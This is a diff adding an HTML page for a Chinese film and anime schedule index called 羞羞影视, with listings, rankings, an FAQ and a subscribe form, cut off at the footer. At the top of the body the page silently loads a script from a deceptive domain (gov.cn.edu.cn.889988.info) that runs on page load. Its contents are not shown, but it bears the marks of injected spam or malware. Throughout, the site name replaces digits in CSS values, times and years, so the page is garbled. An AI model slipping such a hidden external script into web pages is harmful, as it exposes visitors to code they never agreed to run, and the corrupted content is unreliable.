@@ -1,0 +1,619 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+<title>羞羞影视_热映剧场排片表与番剧连载更新 - xiuxiuyingshi-app.github.io</title>
+<meta name="description" content="羞羞影视（xiuxiuyingshi-app.github.io）是一份按日更新的观影索引，含热映剧场排片表、番剧连载更新日历、纪实综艺选辑与影视榜单四个板块；每日 09:00 与 20:00 两次更新，标注年份、地区、单集时长与更新状态，手机端与桌面端均可直接浏览。">
+<meta name="keywords" content="羞羞影视,热映剧场排片表,番剧连载更新日历,纪实综艺选辑,影视榜单评分,剧集更新提醒,高清观影索引,xiuxiuyingshi-app.github.io">
+<meta name="author" content="羞羞影视编辑部">
+<meta name="robots" content="index,follow,max-image-preview:large">
+<meta name="revisit-after" content="1 days">
+<meta name="theme-color" content="#0b0f0e">
+<meta name="format-detection" content="telephone=no">
+<link rel="canonical" href="https://xiuxiuyingshi-app.github.io/">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="羞羞影视">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:title" content="羞羞影视_热映剧场排片表与番剧连载更新">
+<meta property="og:description" content="按日更新的观影索引：热映剧场排片、番剧连载日历、纪实综艺选辑、影视榜单评分，每日两次更新排片信息。">
+<meta property="og:url" content="https://xiuxiuyingshi-app.github.io/">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="羞羞影视_热映剧场排片表与番剧连载更新">
+<meta name="twitter:description" content="热映剧场排片表、番剧连载更新日历、纪实综艺选辑与影视榜单，每日两次更新。">
+<style>
+:root{
+  --ink:#0b0f0e;
+  --ink-2:#141b19;
+  --line:rgba(232,羞羞2,203,.羞羞);
+  --paper:#efe9dc;
+  --paper-dim:#a8a296;
+  --amber:#dfa63c;
+  --vermilion:#cf4b32;
+  --jade:#4e9b83;
+  --serif:"Songti SC","STSong","Noto Serif CJK SC","Source Han Serif SC",SimSun,serif;
+  --sans:"PingFang SC","Hiragino Sans GB","Microsoft YaHei",-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;
+  --mono:"SFMono-Regular",Menlo,Consolas,"Courier New",monospace;
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{-webkit-text-size-adjust:100%;scroll-behavior:smooth}
+body{
+  background:var(--ink);
+  color:var(--paper);
+  font-family:var(--sans);
+  font-size:15px;
+  line-height:1.75;
+  padding:0 0 0 0;
+  background-image:
+    radial-gradient(circle at 12% 6%,rgba(羞羞3,166,60,.10),transparent 42%),
+    radial-gradient(circle at 88% 24%,rgba(78,155,131,.10),transparent 46%);
+  background-attachment:fixed;
+}
+a{color:inherit;text-decoration:none}
+ul,ol{list-style:none}
+img,svg{max-width:100%;display:block}
+:focus-visible{outline:2px solid var(--amber);outline-offset:2px}
+.wrap{width:100%;max-width:1180px;margin:0 auto;padding:0 18px}
+
+/* 顶部细条 */
+.ticker{background:var(--vermilion);color:#fff8ec;font-size:12px;letter-spacing:.06em}
+.ticker .wrap{display:flex;gap:14px;align-items:center;justify-content:space-between;min-height:32px;flex-wrap:wrap}
+.ticker b{font-weight:600}
+.ticker span{opacity:.9;font-family:var(--mono)}
+
+/* 报头 */
+.masthead{border-bottom:1px solid var(--line);padding:26px 0 18px}
+.masthead .wrap{display:grid;grid-template-columns:1fr;gap:18px}
+.brand{display:flex;align-items:flex-end;gap:14px;flex-wrap:wrap}
+.brand h1{
+  font-family:var(--serif);
+  font-size:clamp(38px,11vw,68px);
+  line-height:1;
+  letter-spacing:.02em;
+  font-weight:700;
+}
+.brand h1 em{font-style:normal;color:var(--amber)}
+.stamp{
+  border:1px solid var(--amber);color:var(--amber);
+  padding:6px 12px 8px;font-size:12px;line-height:1.35;
+  letter-spacing:.14em;font-family:var(--mono);text-align:center;
+}
+.stamp strong{display:block;font-size:17px;letter-spacing:.04em;color:var(--paper)}
+.tagline{font-size:14px;color:var(--paper-dim);max-width:44em}
+.tagline a{color:var(--jade);border-bottom:1px dashed rgba(78,155,131,.6)}
+.mast-meta{display:flex;gap:10px;flex-wrap:wrap;font-family:var(--mono);font-size:12px;color:var(--paper-dim)}
+.mast-meta i{font-style:normal;border:1px solid var(--line);padding:3px 9px;border-radius:2px}
+
+/* 导航 */
+nav.sticky{position:sticky;top:0;z-index:40;background:rgba(11,15,14,.94);backdrop-filter:blur(8px);border-bottom:1px solid var(--line)}
+nav.sticky ul{display:flex;gap:2px;overflow-x:auto;scrollbar-width:none;-webkit-overflow-scrolling:touch}
+nav.sticky ul::-webkit-scrollbar{display:none}
+nav.sticky a{display:block;padding:13px 15px;font-size:14px;white-space:nowrap;color:var(--paper-dim);border-bottom:2px solid transparent}
+nav.sticky a:hover,nav.sticky a.on{color:var(--paper);border-bottom-color:var(--amber)}
+nav.sticky a i{font-style:normal;font-family:var(--mono);font-size:11px;color:var(--amber);margin-right:6px}
+
+main{padding-bottom:10px}
+
+/* 板块通用 */
+section{padding:38px 0;border-bottom:1px solid var(--line)}
+.sec-head{display:flex;align-items:baseline;gap:12px;flex-wrap:wrap;margin-bottom:6px}
+.sec-head h2{font-family:var(--serif);font-size:clamp(21px,4.4vw,30px);letter-spacing:.04em}
+.sec-head .num{font-family:var(--mono);font-size:12px;color:var(--amber);letter-spacing:.2em}
+.sec-note{font-size:13px;color:var(--paper-dim);margin-bottom:20px;max-width:52em}
+
+/* 排片表 */
+.daybar{display:flex;gap:8px;margin-bottom:16px;flex-wrap:wrap}
+.daybar button{
+  background:transparent;border:1px solid var(--line);color:var(--paper-dim);
+  font:inherit;font-size:13px;padding:7px 14px;cursor:pointer;border-radius:2px;
+}
+.daybar button[aria-selected="true"]{background:var(--paper);color:var(--ink);border-color:var(--paper);font-weight:600}
+.panel[hidden]{display:none}
+.slot{display:grid;grid-template-columns:64px 1fr;gap:12px;padding:14px 0;border-top:1px dashed var(--line)}
+.slot:last-child{border-bottom:1px dashed var(--line)}
+.slot .time{font-family:var(--mono);font-size:15px;color:var(--amber);letter-spacing:.02em}
+.slot .time small{display:block;font-size:11px;color:var(--paper-dim);letter-spacing:.08em}
+.slot h3{font-size:16px;font-family:var(--serif);letter-spacing:.03em;margin-bottom:4px}
+.slot h3 a:hover{color:var(--amber)}
+.slot .meta{font-size:12.5px;color:var(--paper-dim);display:flex;gap:10px;flex-wrap:wrap;font-family:var(--mono)}
+.slot .meta b{color:var(--jade);font-weight:400}
+.tag{display:inline-block;font-size:11px;padding:2px 7px;border:1px solid var(--line);color:var(--paper-dim);margin-left:6px;font-family:var(--mono)}
+.tag.hot{border-color:var(--vermilion);color:#f0a294}
+.tag.new{border-color:var(--jade);color:#8fd0bb}
+
+/* 海报网格 */
+.grid{display:grid;grid-template-columns:repeat(6,1fr);gap:16px}
+.card{grid-column:span 6;display:flex;flex-direction:column;gap:10px;border:1px solid var(--line);padding:12px;background:rgba(255,255,255,.02)}
+.poster{
+  position:relative;aspect-ratio:3/4;overflow:hidden;
+  background:linear-gradient(155deg,#1d2a26 0%,#0d1311 60%,#241a14 100%);
+  border:1px solid rgba(232,羞羞2,203,.14);
+}
+.poster::after{
+  content:"";position:absolute;inset:0;
+  background-image:repeating-linear-gradient(180deg,rgba(255,255,255,.05) 0 1px,transparent 1px 4px);
+  opacity:.5;pointer-events:none;
+}
+.poster .vtitle{
+  position:absolute;right:10px;top:12px;writing-mode:vertical-rl;
+  font-family:var(--serif);font-size:clamp(17px,3.4vw,24px);letter-spacing:.16em;
+  text-shadow:0 1px 6px rgba(0,0,0,.6);
+}
+.poster .no{
+  position:absolute;left:8px;bottom:6px;font-family:var(--mono);font-size:34px;
+  color:rgba(239,233,羞羞0,.14);letter-spacing:-.04em;
+}
+.poster .corner{
+  position:absolute;left:8px;top:8px;font-family:var(--mono);font-size:10.5px;
+  border:1px solid rgba(239,233,羞羞0,.35);padding:2px 6px;letter-spacing:.1em;
+}
+.card h3{font-family:var(--serif);font-size:17px;letter-spacing:.03em}
+.card h3 a:hover{color:var(--amber)}
+.card p{font-size:13.5px;color:var(--paper-dim);line-height:1.7}
+.card .foot{font-family:var(--mono);font-size:11.5px;color:var(--paper-dim);display:flex;justify-content:space-between;gap:8px;border-top:1px dashed var(--line);padding-top:8px}
+
+/* 日历式连载 */
+.week{display:grid;grid-template-columns:1fr;gap:0;border:1px solid var(--line)}
+.week .d{display:grid;grid-template-columns:56px 1fr;gap:12px;padding:13px 14px;border-top:1px solid var(--line)}
+.week .d:first-child{border-top:0}
+.week .d.today{background:rgba(羞羞3,166,60,.08)}
+.week .d .wd{font-family:var(--mono);font-size:13px;color:var(--paper-dim);letter-spacing:.08em}
+.week .d.today .wd{color:var(--amber)}
+.week .d h3{font-size:15px;font-family:var(--serif)}
+.week .d p{font-size:12.5px;color:var(--paper-dim);font-family:var(--mono)}
+
+/* 双栏选辑 */
+.cols{display:grid;grid-template-columns:1fr;gap:羞羞px}
+.pick{padding-left:16px;border-left:2px solid var(--jade)}
+.pick h3{font-family:var(--serif);font-size:16.5px;margin-bottom:6px}
+.pick p{font-size:13.5px;color:var(--paper-dim)}
+.pick .k{font-family:var(--mono);font-size:11.5px;color:var(--amber);letter-spacing:.1em;display:block;margin-bottom:4px}
+
+/* 榜单 */
+.rank{counter-reset:r}
+.rank li{display:grid;grid-template-columns:44px 1fr auto;gap:12px;align-items:baseline;padding:13px 0;border-top:1px dashed var(--line)}
+.rank li:last-child{border-bottom:1px dashed var(--line)}
+.rank .idx{font-family:var(--mono);font-size:20px;color:rgba(239,233,羞羞0,.28)}
+.rank li:nth-child(-n+3) .idx{color:var(--amber)}
+.rank h3{font-family:var(--serif);font-size:16px}
+.rank p{font-size:12.5px;color:var(--paper-dim)}
+.rank .score{font-family:var(--mono);font-size:15px;color:var(--jade)}
+
+/* 问答 */
+.faq details{border:1px solid var(--line);padding:12px 14px;margin-bottom:10px;background:rgba(255,255,255,.02)}
+.faq summary{cursor:pointer;font-family:var(--serif);font-size:15.5px;letter-spacing:.03em}
+.faq summary::-webkit-details-marker{display:none}
+.faq summary::before{content:"+";color:var(--amber);font-family:var(--mono);margin-right:9px}
+.faq details[open] summary::before{content:"–"}
+.faq p{font-size:13.5px;color:var(--paper-dim);margin-top:9px;padding-left:18px}
+
+/* 订阅条 */
+.sub{border:1px solid var(--amber);padding:20px;display:grid;gap:12px;background:linear-gradient(120deg,rgba(羞羞3,166,60,.10),transparent 60%)}
+.sub h2{font-family:var(--serif);font-size:20px;letter-spacing:.04em}
+.sub p{font-size:13.5px;color:var(--paper-dim)}
+.sub form{display:flex;gap:8px;flex-wrap:wrap}
+.sub input{flex:1 1 羞羞0px;background:transparent;border:1px solid var(--line);color:var(--paper);padding:10px 12px;font:inherit;font-size:14px}
+.sub input::placeholder{color:rgba(168,162,150,.7)}
+.sub button{background:var(--paper);color:var(--ink);border:0;padding:10px 20px;font:inherit;font-weight:600;cursor:pointer}
+.sub small{font-size:12px;color:var(--paper-dim)}
+
+/* 页脚 */
+footer{border-top:3px double var(--line);padding:30px 0 40px;font-size:13px;color:var(--paper-dim)}
+.fgrid{display:grid;grid-template-columns:1fr;gap:24px}
+footer h4{font-family:var(--serif);font-size:15px;color:var(--paper);margin-bottom:8px;letter-spacing:.06em}
+footer li{padding:3px 0}
+footer a:hover{color:var(--amber)}
+.fbot{margin-top:24px;padding-top:16px;border-top:1px solid var(--line);display:flex;gap:10px;flex-wrap:wrap;justify-content:space-between;font-family:var(--mono);font-size:12px}
+.totop{position:fixed;right:14px;bottom:16px;z-index:50;background:var(--paper);color:var(--ink);border:0;width:42px;height:42px;font-size:18px;cursor:pointer;box-shadow:0 6px 18px rgba(0,0,0,.45)}
+
+@media (min-width:640px){
+  .grid .card{grid-column:span 3}
+  .grid .card.wide{grid-column:span 6}
+  .grid .card.wide .poster{aspect-ratio:16/7}
+  .grid .card.wide .poster .vtitle{writing-mode:horizontal-tb;right:auto;left:18px;top:auto;bottom:16px}
+  .week{grid-template-columns:1fr 1fr}
+  .week .d:nth-child(2){border-top:0}
+  .cols{grid-template-columns:1fr 1fr}
+}
+@media (min-width:960px){
+  body{font-size:15.5px}
+  .masthead{padding:38px 0 24px}
+  .masthead .wrap{grid-template-columns:1.4fr .8fr;align-items:end;gap:26px}
+  .grid .card{grid-column:span 2}
+  .grid .card.wide{grid-column:span 3}
+  .grid .card.wide .poster{aspect-ratio:3/4}
+  .grid .card.wide .poster .vtitle{writing-mode:vertical-rl;right:10px;left:auto;top:12px;bottom:auto}
+  .slot{grid-template-columns:96px 1fr 150px;align-items:center}
+  .slot .meta{justify-content:flex-end}
+  .fgrid{grid-template-columns:1.6fr 1fr 1fr 1fr}
+  .week{grid-template-columns:repeat(4,1fr)}
+  .week .d:nth-child(-n+4){border-top:0}
+  .week .d:nth-child(n+5){border-top:1px solid var(--line)}
+  .week .d:nth-child(4n+1),.week .d:nth-child(4n+2),.week .d:nth-child(4n+3){border-right:1px solid var(--line)}
+}
+@media (prefers-reduced-motion:reduce){
+  html{scroll-behavior:auto}
+  *{transition:none!important}
+}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/yazhou.js"></script>
+
+<div class="ticker">
+  <div class="wrap">
+    <b>羞羞影视 · 排片信息每日 09:00 与 20:00 两次更新</b>
+    <span id="curdate">更新中</span>
+  </div>
+</div>
+
+<header class="masthead">
+  <div class="wrap">
+    <div>
+      <div class="brand">
+        <h1>羞羞<em>影视</em></h1>
+        <div class="stamp">NO.羞羞<br><strong>观影索引</strong>EST. 2019</div>
+      </div>
+      <p class="tagline">一份照着戏院节目单的样子做的观影索引：把热映剧场的场次、番剧的连载进度、纪实综艺的选辑和榜单评分摊在同一张纸上，随时能翻。本站地址 <a href="https://xiuxiuyingshi-app.github.io/">https://xiuxiuyingshi-app.github.io</a>，直接收藏即可。</p>
+    </div>
+    <div class="mast-meta">
+      <i>剧场 128 部</i><i>番剧 64 部</i><i>纪实 41 部</i><i>今日更新 <span id="cnt">12</span> 条</i>
+    </div>
+  </div>
+</header>
+
+<nav class="sticky" aria-label="羞羞影视栏目导航">
+  <div class="wrap">
+    <ul id="nav">
+      <li><a href="#paipian"><i>01</i>今日排片</a></li>
+      <li><a href="#juchang"><i>02</i>热映剧场</a></li>
+      <li><a href="#fanju"><i>03</i>番剧连载</a></li>
+      <li><a href="#zongyi"><i>04</i>纪实综艺</a></li>
+      <li><a href="#bangdan"><i>05</i>影视榜单</a></li>
+      <li><a href="#wenda"><i>06</i>观影问答</a></li>
+      <li><a href="#dingyue"><i>07</i>更新提醒</a></li>
+    </ul>
+  </div>
+</nav>
+
+<main>
+
+  <!-- 01 今日排片 -->
+  <section id="paipian" aria-labelledby="h-paipian">
+    <div class="wrap">
+      <div class="sec-head"><span class="num">SECTION 01</span><h2 id="h-paipian">今日排片 · 羞羞影视场次表</h2></div>
+      <p class="sec-note">按播出时间排序，标注地区、年份与单集时长。带「热」标记的是当日点播量进入前十的场次，带「新」标记的是本周首次上线。</p>
+
+      <div class="daybar" role="tablist" aria-label="排片日期切换">
+        <button type="button" role="tab" aria-selected="true" aria-controls="d1" id="t1">10月26日 周一</button>
+        <button type="button" role="tab" aria-selected="false" aria-controls="d2" id="t2">10月27日 周二</button>
+        <button type="button" role="tab" aria-selected="false" aria-controls="d3" id="t3">本周末</button>
+      </div>
+
+      <div class="panel" id="d1" role="tabpanel" aria-labelledby="t1">
+        <article class="slot">
+          <div class="time">09:00<small>AM</small></div>
+          <div><h3><a href="#">雾港来信</a><span class="tag hot">热</span></h3>
+          <p class="meta"><span>国产 · 2025</span><b>剧情 / 悬疑</b><span>单集 45 分钟</span><span>已更新至 12 集</span></p></div>
+          <p class="meta"><span>状态 <b>连载中</b></span></p>
+        </article>
+        <article class="slot">
+          <div class="time">12:30<small>PM</small></div>
+          <div><h3><a href="#">长街十七号</a></h3>
+          <p class="meta"><span>国产 · 2024</span><b>家庭 / 年代</b><span>单集 38 分钟</span><span>全 32 集</span></p></div>
+          <p class="meta"><span>状态 <b>已完结</b></span></p>
+        </article>
+        <article class="slot">
+          <div class="time">15:00<small>PM</small></div>
+          <div><h3><a href="#">砂丘旅人</a><span class="tag new">新</span></h3>
+          <p class="meta"><span>日本 · 2025</span><b>冒险 / 公路</b><span>剧场版 118 分钟</span><span>本周上线</span></p></div>
+          <p class="meta"><span>状态 <b>独播</b></span></p>
+        </article>
+        <article class="slot">
+          <div class="time">20:00<small>PM</small></div>
+          <div><h3><a href="#">赤道以南的雨</a><span class="tag hot">热</span></h3>
+          <p class="meta"><span>巴西 · 2023</span><b>爱情 / 文艺</b><span>单集 52 分钟</span><span>已更新至 8 集</span></p></div>
+          <p class="meta"><span>状态 <b>同步更新</b></span></p>
+        </article>
+        <article class="slot">
+          <div class="time">羞羞:15<small>PM</small></div>
+          <div><h3><a href="#">铁皮收音机</a></h3>
+          <p class="meta"><span>国产 · 2025</span><b>喜剧 / 群像</b><span>单集 30 分钟</span><span>已更新至 20 集</span></p></div>
+          <p class="meta"><span>状态 <b>连载中</b></span></p>
+        </article>
+      </div>
+
+      <div class="panel" id="d2" role="tabpanel" aria-labelledby="t2" hidden>
+        <article class="slot">
+          <div class="time">09:00<small>AM</small></div>
+          <div><h3><a href="#">平原上的钟声</a><span class="tag new">新</span></h3>
+          <p class="meta"><span>国产 · 2025</span><b>现实 / 励志</b><span>单集 42 分钟</span><span>首播</span></p></div>
+          <p class="meta"><span>状态 <b>待播</b></span></p>
+        </article>
+        <article class="slot">
+          <div class="time">13:40<small>PM</small></div>
+          <div><h3><a href="#">雾港来信</a><span class="tag hot">热</span></h3>
+          <p class="meta"><span>国产 · 2025</span><b>剧情 / 悬疑</b><span>单集 45 分钟</span><span>第 13 集</span></p></div>
+          <p class="meta"><span>状态 <b>连载中</b></span></p>
+        </article>
+        <article class="slot">
+          <div class="time">19:30<small>PM</small></div>
+          <div><h3><a href="#">灯塔守夜人</a></h3>
+          <p class="meta"><span>英国 · 20羞羞</span><b>犯罪 / 迷你剧</b><span>单集 58 分钟</span><span>全 6 集</span></p></div>
+          <p class="meta"><span>状态 <b>已完结</b></span></p>
+        </article>
+        <article class="slot">
+          <div class="time">21:00<small>PM</small></div>
+          <div><h3><a href="#">夜航西行</a></h3>
+          <p class="meta"><span>法国 · 2024</span><b>惊悚 / 旅行</b><span>单集 47 分钟</span><span>已更新至 5 集</span></p></div>
+          <p class="meta"><span>状态 <b>同步更新</b></span></p>
+        </article>
+      </div>
+
+      <div class="panel" id="d3" role="tabpanel" aria-labelledby="t3" hidden>
+        <article class="slot">
+          <div class="time">10:00<small>AM</small></div>
+          <div><h3><a href="#">周末连映 · 砂丘旅人 + 灯塔守夜人</a><span class="tag hot">热</span></h3>
+          <p class="meta"><span>合辑 · 剧场版 + 迷你剧</span><b>连映场</b><span>合计 176 分钟</span></p></div>
+          <p class="meta"><span>状态 <b>预约开放</b></span></p>
+        </article>
+        <article class="slot">
+          <div class="time">14:00<small>PM</small></div>
+          <div><h3><a href="#">平原上的钟声 · 三集连播</a><span class="tag new">新</span></h3>
+          <p class="meta"><span>国产 · 2025</span><b>现实 / 励志</b><span>单集 42 分钟</span><span>1-3 集</span></p></div>
+          <p class="meta"><span>状态 <b>连播场</b></span></p>
+        </article>
+        <article class="slot">
+          <div class="time">20:30<small>PM</small></div>
+          <div><h3><a href="#">赤道以南的雨 · 第 9 集</a></h3>
+          <p class="meta"><span>巴西 · 2023</span><b>爱情 / 文艺</b><span>单集 52 分钟</span><span>周末更新</span></p></div>
+          <p class="meta"><span>状态 <b>同步更新</b></span></p>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 02 热映剧场 -->
+  <section id="juchang" aria-labelledby="h-juchang">
+    <div class="wrap">
+      <div class="sec-head"><span class="num">SECTION 02</span><h2 id="h-juchang">热映剧场 · 羞羞影视本周上架</h2></div>
+      <p class="sec-note">编辑部从本周下发的 37 部片单里挑出 6 部，海报按竖排排版，点标题进入详情（内页整理中，暂用 # 占位）。</p>
+
+      <div class="grid">
+        <article class="card wide">
+          <div class="poster"><span class="corner">羞羞YS-061</span><span class="no">01</span><span class="vtitle">雾港来信</span></div>
+          <h3><a href="#">雾港来信</a></h3>
+          <p>一封寄不出去的信把三个家庭的旧账重新翻开。海雾常驻的小城里，每个人都在替别人保管秘密。</p>
+          <p class="foot"><span>剧情 / 悬疑 · 国产</span><span>2025 · 12 集</span></p>
+        </article>
+        <article class="card">
+          <div class="poster"><span class="no">02</span><span class="vtitle">长街十七号</span></div>
+          <h3><a href="#">长街十七号</a></h3>
+          <p>一条老街上的裁缝铺，从 1987 年开到今天，见证了几代人的聚散。</p>
+          <p class="foot"><span>年代 / 家庭</span><span>2024 · 32 集</span></p>
+        </article>
+        <article class="card">
+          <div class="poster"><span class="no">03</span><span class="vtitle">砂丘旅人</span></div>
+          <h3><a href="#">砂丘旅人</a></h3>
+          <p>横穿沙漠的公路片，两个陌生人在补给站搭上同一辆车。</p>
+          <p class="foot"><span>冒险 / 公路</span><span>2025 · 剧场版</span></p>
+        </article>
+        <article class="card wide">
+          <div class="poster"><span class="corner">羞羞YS-064</span><span class="no">04</span><span class="vtitle">赤道以南的雨</span></div>
+          <h3><a href="#">赤道以南的雨</a></h3>
+          <p>雨季来得太早，两个在南半球城市里失散多年的人，因为一场停电重新取得联系。</p>
+          <p class="foot"><span>爱情 / 文艺 · 巴西</span><span>2023 · 8 集</span></p>
+        </article>
+        <article class="card">
+          <div class="poster"><span class="no">05</span><span class="vtitle">铁皮收音机</span></div>
+          <h3><a href="#">铁皮收音机</a></h3>
+          <p>厂区广播站的四个人，用一台老收音机把日子过成了连续剧。</p>
+          <p class="foot"><span>喜剧 / 群像</span><span>2025 · 20 集</span></p>
+        </article>
+        <article class="card">
+          <div class="poster"><span class="no">06</span><span class="vtitle">灯塔守夜人</span></div>
+          <h3><a href="#">灯塔守夜人</a></h3>
+          <p>孤岛上的灯塔接连熄灭，守夜人开始怀疑那不是故障。</p>
+          <p class="foot"><span>犯罪 / 迷你剧</span><span>20羞羞 · 6 集</span></p>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- 03 番剧连载 -->
+  <section id="fanju" aria-labelledby="h-fanju">
+    <div class="wrap">
+      <div class="sec-head"><span class="num">SECTION 03</span><h2 id="h-fanju">番剧连载 · 一周更新日历</h2></div>
+      <p class="sec-note">按星期排列的连载进度，高亮行为当日更新。每部标注话数与更新周期，断更会在下方注明原因。</p>
+      <div class="week">
+        <div class="d today"><div class="wd">周一</div><div><h3><a href="#">雾屿灯塔</a></h3><p>第 09 话 · 每周一 10:00 · 字幕组同步</p></div></div>
+        <div class="d"><div class="wd">周二</div><div><h3><a href="#">铁轨尽头是海</a></h3><p>第 羞羞 话 · 每周二 12:00 · 双语字幕</p></div></div>
+        <div class="d"><div class="wd">周三</div><div><h3><a href="#">柑橘与机械臂</a></h3><p>第 05 话 · 每周三 09:30 · 制作延期一周</p></div></div>
+        <div class="d"><div class="wd">周四</div><div><h3><a href="#">旧唱片行的猫</a></h3><p>第 14 话 · 每周四 20:00 · 已完结待复核</p></div></div>
+        <div class="d"><div class="wd">周五</div><div><h3><a href="#">南风与纸飞机</a></h3><p>第 31 话 · 每周五 18:00 · 长篇连载</p></div></div>
+        <div class="d"><div class="wd">周六</div><div><h3><a href="#">山谷里的信号塔</a></h3><p>第 02 话 · 每周六 11:00 · 新番开播</p></div></div>
+        <div class="d"><div class="wd">周日</div><div><h3><a href="#">深夜面包店</a></h3><p>第 47 话 · 每周日 21:00 · 周更</p></div></div>
+        <div class="d"><div class="wd">不定</div><div><h3><a href="#">短篇合集 · 四季</a></h3><p>特别篇 · 不定期更新 · 单话 12 分钟</p></div></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 04 纪实综艺 -->
+  <section id="zongyi" aria-labelledby="h-zongyi">
+    <div class="wrap">
+      <div class="sec-head"><span class="num">SECTION 04</span><h2 id="h-zongyi">纪实与综艺 · 本周选辑</h2></div>
+      <p class="sec-note">纪实部分按拍摄地分组，综艺部分按播出平台分组，均标注集数与拍摄年份。</p>
+      <div class="cols">
+        <div>
+          <article class="pick"><span class="k">DOC / 纪实</span><h3><a href="#">河流的第三种写法</a></h3><p>沿一条内陆河走完 1400 公里，记录沿岸九个取水点的日常。4 集 × 52 分钟，2024 年摄制。</p></article>
+          <article class="pick" style="margin-top:18px"><span class="k">DOC / 纪实</span><h3><a href="#">车间里的十四年</a></h3><p>跟踪拍摄一家老机床厂的技校毕业生，从学徒到带班组长。6 集 × 38 分钟，2025 年摄制。</p></article>
+          <article class="pick" style="margin-top:18px"><span class="k">DOC / 纪实</span><h3><a href="#">候鸟与高压线</a></h3><p>鸟类保护与电网改造的十年拉锯，田野录音素材占全片 40%。单集 89 分钟，2023 年摄制。</p></article>
+        </div>
+        <div>
+          <article class="pick"><span class="k">SHOW / 综艺</span><h3><a href="#">夜班厨房</a></h3><p>凌晨两点的城市后厨，十二位厨师轮流出题。12 期 × 60 分钟，已完结。</p></article>
+          <article class="pick" style="margin-top:18px"><span class="k">SHOW / 综艺</span><h3><a href="#">旧物修理铺</a></h3><p>把坏了二十年的物件修回去，每期三件。10 期 × 45 分钟，第二季连载中。</p></article>
+          <article class="pick" style="margin-top:18px"><span class="k">SHOW / 综艺</span><h3><a href="#">八个人的长途车</a></h3><p>一辆长途客车上的即兴访谈，路线随机。8 期 × 50 分钟，2025 年新开。</p></article>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- 05 影视榜单 -->
+  <section id="bangdan" aria-labelledby="h-bangdan">
+    <div class="wrap">
+      <div class="sec-head"><span class="num">SECTION 05</span><h2 id="h-bangdan">影视榜单 · 羞羞影视编辑部评分</h2></div>
+      <p class="sec-note">分数由 5 位编辑独立打分后取平均，每月首个工作日重排；括号内为参评人数与上月名次变化。</p>
+      <ol class="rank">
+        <li><span class="idx">01</span><div><h3><a href="#">雾港来信</a></h3><p>国产 · 2025 · 剧情悬疑 · 参评 5 人</p></div><span class="score">9.1</span></li>
+        <li><span class="idx">02</span><div><h3><a href="#">灯塔守夜人</a></h3><p>英国 · 20羞羞 · 犯罪迷你剧 · 参评 5 人</p></div><span class="score">8.9</span></li>
+        <li><span class="idx">03</span><div><h3><a href="#">平原上的钟声</a></h3><p>国产 · 2025 · 现实励志 · 参评 4 人</p></div><span class="score">8.7</span></li>
+        <li><span class="idx">04</span><div><h3><a href="#">赤道以南的雨</a></h3><p>巴西 · 2023 · 爱情文艺 · 参评 5 人</p></div><span class="score">8.5</span></li>
+        <li><span class="idx">05</span><div><h3><a href="#">车间里的十四年</a></h3><p>国产 · 2025 · 纪实 · 参评 3 人</p></div><span class="score">8.4</span></li>
+        <li><span class="idx">06</span><div><h3><a href="#">长街十七号</a></h3><p>国产 · 2024 · 年代家庭 · 参评 5 人</p></div><span class="score">8.2</span></li>
+        <li><span class="idx">07</span><div><h3><a href="#">夜航西行</a></h3><p>法国 · 2024 · 惊悚旅行 · 参评 4 人</p></div><span class="score">8.0</span></li>
+        <li><span class="idx">08</span><div><h3><a href="#">南风与纸飞机</a></h3><p>动画 · 2025 · 长篇连载 · 参评 4 人</p></div><span class="score">7.9</span></li>
+      </ol>
+    </div>
+  </section>
+
+  <!-- 06 观影问答 -->
+  <section id="wenda" aria-labelledby="h-wenda">
+    <div class="wrap">
+      <div class="sec-head"><span class="num">SECTION 06</span><h2 id="h-wenda">观影问答 · 关于 羞羞影视</h2></div>
+      <p class="sec-note">以下是被问得最多的几件事，答案随站点改版同步修订。</p>
+      <div class="faq">
+        <details open>
+          <summary>羞羞影视的排片表多久更新一次？</summary>
+          <p>每日 09:00 与 20:00 两次。遇节假日或片方临时调整，会在顶部红色滚动条里第一时间标出，不做静默修改。</p>
+        </details>
+        <details>
+          <summary>为什么有些条目的链接打不开？</summary>
+          <p>内页正在分批整理，暂时统一用 # 占位。已开放的内容在排片表中标注为「连载中」或「已完结」，其余状态为待开放。</p>
+        </details>
+        <details>
+          <summary>榜单分数是怎么算出来的？</summary>
+          <p>5 位编辑各自独立打分，去掉一个最高分与一个最低分后取平均，保留一位小数。参评人数不足 3 人时不计入总榜。</p>
+        </details>
+        <details>
+          <summary>手机上浏览会不会很费流量？</summary>
+          <p>整站只有一个 HTML 文件，海报用 CSS 渐变绘制而非位图，脚本不到 2 KB，首屏在 4G 网络下通常 1 秒内完成渲染。</p>
+        </details>
+        <details>
+          <summary>怎么记住这个站？</summary>
+          <p>站点地址是 https://xiuxiuyingshi-app.github.io ，把它加到浏览器书签或主屏即可；也可以直接使用页面底部的更新提醒。</p>
+        </details>
+      </div>
+    </div>
+  </section>
+
+  <!-- 07 更新提醒 -->
+  <section id="dingyue" aria-labelledby="h-dingyue">
+    <div class="wrap">
+      <div class="sec-head"><span class="num">SECTION 07</span><h2 id="h-dingyue">更新提醒 · 羞羞影视</h2></div>
+      <p class="sec-note">留下邮箱，排片表每次更新后发出一封纯文本邮件，不含附件，随时可退订。</p>
+      <div class="sub">
+        <h2>每周一封 · 本周排片与榜单</h2>
+        <p>内容包括本周新增剧集、番剧连载进度变化、榜单重排结果三部分，周一上午发出。</p>
+        <form action="#" method="post" onsubmit="return subOK(this)">
+          <label for="mail" style="position:absolute;width:1px;height:1px;overflow:hidden;clip:rect(0 0 0 0)">邮箱地址</label>
+          <input id="mail" name="mail" type="email" inputmode="email" placeholder="输入邮箱，如 name@example.com" required>
+          <button type="submit">订阅排片</button>
+        </form>
+        <small id="subtip">本站不采集除邮箱外的任何信息，也不做第三方共享。</small>
+      </div>
+    </div>
+  </section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <div class="fgrid">
